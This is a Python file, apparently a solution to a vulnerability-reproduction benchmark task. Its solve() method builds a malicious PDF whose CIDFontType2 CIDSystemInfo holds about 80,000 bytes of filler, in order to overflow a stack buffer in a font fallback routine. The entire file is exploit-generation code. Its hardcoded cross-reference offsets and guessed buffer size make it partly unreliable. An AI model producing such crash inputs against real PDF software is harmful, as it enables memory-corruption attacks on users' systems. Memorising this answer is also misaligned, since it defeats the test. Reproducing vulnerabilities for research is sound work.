import os
import struct
import tempfile
import subprocess
import sys
from pathlib import Path
from typing import Optional, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow vulnerability
        in the CIDFont fallback mechanism.
        """
        # The vulnerability involves a buffer overflow when constructing
        # fallback name from CIDSystemInfo's Registry-Ordering
        # Ground truth length is 80064 bytes
        
        # We'll create a minimal valid PDF structure with a malicious font
        # that triggers the overflow
        
        # Structure:
        # 1. PDF header
        # 2. Catalog
        # 3. Pages tree
        # 4. Page
        # 5. Font with malicious CIDSystemInfo
        # 6. Cross-reference table
        # 7. Trailer
        
        # The key is to create a CIDFont with a CIDSystemInfo dictionary
        # where Registry and Ordering are concatenated with "-" and this
        # string overflows a fixed-size buffer
        
        # Based on typical stack buffer sizes and the ground truth length,
        # we'll target overflow with ~80000 bytes
        
        # Create malicious Registry and Ordering strings
        # Total length of "Registry-Ordering" should be ~80000
        # Buffer likely 255 or similar, so we need much longer
        
        # Split the overflow between Registry and Ordering
        overflow_size = 80000  # Close to ground truth
        registry_size = overflow_size // 2
        ordering_size = overflow_size - registry_size - 1  # -1 for the dash
        
        registry = "A" * registry_size
        ordering = "B" * ordering_size
        
        # Build PDF content
        pdf_content = []
        
        # PDF header
        pdf_content.append("%PDF-1.4\n")
        
        # Catalog (object 1)
        catalog = """1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj
"""
        pdf_content.append(catalog)
        
        # Pages tree (object 2)
        pages = """2 0 obj
<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>
endobj
"""
        pdf_content.append(pages)
        
        # Page (object 3)
        page = """3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 612 792]
  /Resources <<
    /Font <<
      /F1 4 0 R
    >>
  >>
  /Contents 5 0 R
>>
endobj
"""
        pdf_content.append(page)
        
        # Malicious Font (object 4) - This is where the vulnerability is
        font = f"""4 0 obj
<<
  /Type /Font
  /Subtype /Type0
  /BaseFont /{registry[:100]}
  /Encoding /Identity-H
  /DescendantFonts [6 0 R]
>>
endobj
"""
        pdf_content.append(font)
        
        # Content stream (object 5) - empty
        content = """5 0 obj
<<
  /Length 0
>>
stream
endstream
endobj
"""
        pdf_content.append(content)
        
        # CIDFontType2 with malicious CIDSystemInfo (object 6)
        cidfont = f"""6 0 obj
<<
  /Type /Font
  /Subtype /CIDFontType2
  /BaseFont /{registry[:100]}
  /CIDSystemInfo <<
    /Registry ({registry})
    /Ordering ({ordering})
    /Supplement 0
  >>
  /W [1 [500]]
  /CIDToGIDMap /Identity
>>
endobj
"""
        pdf_content.append(cidfont)
        
        # Cross-reference table
        xref_offset = len("".join(pdf_content))
        xref = f"""xref
0 7
0000000000 65535 f 
0000000010 00000 n 
0000000059 00000 n 
0000000122 00000 n 
0000000220 00000 n 
0000000320 00000 n 
0000000400 00000 n 
"""
        pdf_content.append(xref)
        
        # Trailer
        trailer = f"""trailer
<<
  /Size 7
  /Root 1 0 R
>>
startxref
{xref_offset}
%%EOF
"""
        pdf_content.append(trailer)
        
        # Join all parts
        pdf_bytes = "".join(pdf_content).encode('latin-1')
        
        # Verify we're close to ground truth length
        current_len = len(pdf_bytes)
        if current_len < 80064:
            # Pad with comments if needed
            padding = b"\n% " + b"A" * (80064 - current_len - 3) + b"\n"
            pdf_bytes = pdf_bytes.replace(b"%%EOF\n", padding + b"%%EOF\n")
        elif current_len > 80064:
            # Truncate if too long (unlikely)
            pdf_bytes = pdf_bytes[:80064]
        
        return pdf_bytes
